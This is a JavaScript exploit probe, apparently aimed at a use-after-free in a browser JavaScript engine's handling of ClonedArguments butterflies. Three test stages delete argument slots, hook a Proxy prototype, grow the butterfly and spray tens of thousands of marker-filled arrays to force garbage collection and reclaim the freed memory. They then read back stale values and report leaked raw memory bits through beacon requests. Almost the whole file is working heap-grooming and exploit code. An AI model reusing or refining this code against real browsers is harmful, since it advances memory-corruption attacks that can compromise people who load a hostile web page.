// p223 — ClonedArguments butterfly UAF: force GC + MarkedBlock sweep reclaim
//
// ALL PREVIOUS SPRAYS FAILED BECAUSE:
// 1. ArrayBuffer backing stores are FastMalloc — wrong allocator
// 2. 8K-20K arrays = ~5-12MB, but eden GC threshold = ~32MB
// 3. Without GC cycle, old butterfly is never swept → can't reclaim
//
// SIZE CLASS: 608 bytes (520-byte butterfly rounds up)
// CELLS PER BLOCK: 26 per 16KB MarkedBlock
// VECTOR LENGTH: 75 elements (608-8)/8 = 75 per butterfly
//
// STRATEGY: Allocate >40MB of GC-managed butterfly arrays to force
// synchronous GC via collectInMutatorThread. After GC marks old butterfly
// as dead, subsequent allocations sweep its block and reclaim the cell.
//
// Beacon prefix: V223-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V223-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var NARGS = 64;

  // ---- TEST A: Massive butterfly allocation to force GC ----
  // 80K arrays × 608 bytes per butterfly = ~48.6MB in aux space
  // Plus ~5MB for JSArray cells = >50MB total GC allocation
  // Eden threshold ~32MB → GC MUST trigger
  try {
    BS('A-START');
    var trapCount = 0;
    var spray = [];

    var manyArgs = [];
    for (var a = 0; a < NARGS; a++) manyArgs.push(a + 1);
    var args = target.apply(null, manyArgs);

    delete args[3];
    delete args[7];
    delete args[11];
    delete args[15];
    delete args[19];

    var trap = {
      get: function(t, prop) {
        trapCount++;
        if (trapCount === 1) {
          BS('A-TRAP-' + prop);

          // Step 1: Grow butterfly → old 608-byte cell abandoned in aux space
          for (var j = 100; j < 300; j++) args[j] = 0x41;
          BS('A-GREW');

          // Step 2: Massive spray of 64-element arrays
          // Each creates a 608-byte butterfly in jsValueGigacageAuxiliarySpace
          // 80,000 × 608 = ~48.6MB → exceeds 32MB eden threshold
          // GC fires synchronously via collectInMutatorThread
          // After GC: old butterfly's cell is dead → swept on next alloc
          // Subsequent spray butterflies can land on old cell
          for (var s = 0; s < 80000; s++) {
            var a = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) {
              a[k] = 0xBEEF0000 | k;
            }
            spray.push(a);
          }
          BS('A-SPRAYED-' + spray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 30));
    }

    if (result) {
      BS('A-LEN-' + result.length);

      // Check ALL positions (not just holes) for BEEF pattern
      var beefHits = 0;
      var nonOrig = 0;
      for (var r = 0; r < Math.min(result.length, NARGS); r++) {
        if (r === 3 || r === 7 || r === 11 || r === 15 || r === 19) continue;
        var val = result[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xBEEF) {
            beefHits++;
            if (beefHits <= 10) BS('A-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            nonOrig++;
            if (nonOrig <= 5) {
              var f64 = new Float64Array(1);
              f64[0] = val;
              var u32 = new Uint32Array(f64.buffer);
              BS('A-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
            }
          }
        } else if (typeof val === 'object' && val !== null) {
          nonOrig++;
          BS('A-OBJ-' + r);
        } else if (val === undefined) {
          nonOrig++;
          BS('A-UNDEF-' + r);
        }
      }
      BS('A-BEEF-' + beefHits);
      BS('A-NONORIG-' + nonOrig);

      // Dump first 10 values for diagnostic
      for (var d = 0; d < 10; d++) {
        var v = result[d];
        var f64 = new Float64Array(1);
        f64[0] = (typeof v === 'number') ? v : 0;
        var u32 = new Uint32Array(f64.buffer);
        BS('A-D' + d + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof v);
      }
    }
  } catch (e) {
    BS('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Two-phase — allocate garbage FIRST, release, then spray ----
  // Phase 1: Create and release 50MB of same-size-class arrays to force GC
  // Phase 2: After GC, spray fresh arrays to reclaim
  try {
    BS('B-START');
    var bTrap = 0;
    var bSpray = [];

    var bArgs = [];
    for (var a = 0; a < NARGS; a++) bArgs.push(a + 1);
    var args2 = target.apply(null, bArgs);
    delete args2[3];
    delete args2[7];
    delete args2[11];

    var trap2 = {
      get: function(t, prop) {
        bTrap++;
        if (bTrap === 1) {
          BS('B-TRAP-' + prop);

          // Step 1: Grow butterfly
          for (var j = 100; j < 300; j++) args2[j] = 0x41;
          BS('B-GREW');

          // Step 2: Allocate and release large garbage to trigger GC
          // This creates 60K arrays → ~36MB, then releases them
          // When references are cleared, objects become GC garbage
          var garbage = [];
          for (var g = 0; g < 60000; g++) {
            var a = new Array(NARGS);
            a[0] = g;
            garbage.push(a);
          }
          BS('B-GARBAGE-' + garbage.length);
          // Release references — these become collectible
          garbage.length = 0;
          garbage = null;

          // Step 3: MORE allocation to trigger another GC pass
          // This forces the collector to sweep blocks that now contain
          // both the garbage arrays AND the old butterfly
          for (var g2 = 0; g2 < 60000; g2++) {
            var a = new Array(NARGS);
            a[0] = g2;
            // Don't keep — more garbage
          }
          BS('B-GC-PRESSURE');

          // Step 4: NOW spray with controlled data
          // By this point, multiple GC cycles should have run
          // Old butterfly's cell should be swept and available
          for (var s = 0; s < 40000; s++) {
            var a = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) {
              a[k] = 0xDEAD0000 | k;
            }
            bSpray.push(a);
          }
          BS('B-SPRAYED-' + bSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2));

    var result2;
    try {
      result2 = receiver.apply(null, args2);
    } catch (e) {
      BS('B-ERR-' + e.message.substring(0, 30));
    }

    if (result2) {
      BS('B-LEN-' + result2.length);
      var deadHits = 0;
      var bNonOrig = 0;
      for (var r = 0; r < Math.min(result2.length, NARGS); r++) {
        if (r === 3 || r === 7 || r === 11) continue;
        var val = result2[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xDEAD) {
            deadHits++;
            if (deadHits <= 10) BS('B-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            bNonOrig++;
            if (bNonOrig <= 5) {
              var f64 = new Float64Array(1);
              f64[0] = val;
              var u32 = new Uint32Array(f64.buffer);
              BS('B-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
            }
          }
        } else if (typeof val !== 'number') {
          bNonOrig++;
          BS('B-WEIRD-' + r + '-T' + typeof val);
        }
      }
      BS('B-DEAD-' + deadHits);
      BS('B-NONORIG-' + bNonOrig);

      // Dump first 10 values
      for (var d = 0; d < 10; d++) {
        var v = result2[d];
        var f64 = new Float64Array(1);
        f64[0] = (typeof v === 'number') ? v : 0;
        var u32 = new Uint32Array(f64.buffer);
        BS('B-D' + d + '=' + hex(u32[1]) + '_' + hex(u32[0]) + '_T' + typeof v);
      }
    }
  } catch (e) {
    BS('B-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: WeakRef GC detection ----
  // Create a WeakRef before the trap. If it clears during spray,
  // GC definitely ran. Diagnostic to understand GC timing.
  try {
    BS('C-START');
    var cTrap = 0;
    var cSpray = [];

    var cArgs = [];
    for (var a = 0; a < NARGS; a++) cArgs.push(a + 1);
    var args3 = target.apply(null, cArgs);
    delete args3[3];
    delete args3[7];

    // Create WeakRef target — will be collected if GC runs
    var weakTarget = { sentinel: true };
    var weakRef = new WeakRef(weakTarget);
    weakTarget = null; // only weakRef holds it

    var trap3 = {
      get: function(t, prop) {
        cTrap++;
        if (cTrap === 1) {
          BS('C-TRAP-' + prop);

          // Check WeakRef before grow
          var alive1 = weakRef.deref() !== undefined;
          BS('C-WEAK-BEFORE-' + (alive1 ? 'ALIVE' : 'DEAD'));

          // Grow butterfly
          for (var j = 100; j < 300; j++) args3[j] = 0x41;

          // Massive allocation — 100K arrays → ~60MB GC
          for (var s = 0; s < 100000; s++) {
            var a = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) {
              a[k] = 0xCAFE0000 | k;
            }
            cSpray.push(a);
          }

          // Check WeakRef after massive alloc — did GC run?
          var alive2 = weakRef.deref() !== undefined;
          BS('C-WEAK-AFTER-' + (alive2 ? 'ALIVE' : 'DEAD'));
          BS('C-SPRAYED-' + cSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, trap3));

    var result3;
    try {
      result3 = receiver.apply(null, args3);
    } catch (e) {
      BS('C-ERR-' + e.message.substring(0, 30));
    }

    if (result3) {
      BS('C-LEN-' + result3.length);
      var cafeHits = 0;
      var cNonOrig = 0;
      for (var r = 0; r < Math.min(result3.length, NARGS); r++) {
        if (r === 3 || r === 7) continue;
        var val = result3[r];
        if (typeof val === 'number') {
          var u = val >>> 0;
          if ((u >>> 16) === 0xCAFE) {
            cafeHits++;
            if (cafeHits <= 10) BS('C-HIT-' + r + '=' + hex(u));
          } else if (val !== (r + 1)) {
            cNonOrig++;
          }
        }
      }
      BS('C-CAFE-' + cafeHits);
      BS('C-NONORIG-' + cNonOrig);

      // Final WeakRef check
      var alive3 = weakRef.deref() !== undefined;
      BS('C-WEAK-FINAL-' + (alive3 ? 'ALIVE' : 'DEAD'));
    }
  } catch (e) {
    BS('C-OUTER-ERR-' + e.message.substring(0, 40));
  }

  BS('DONE');
})();
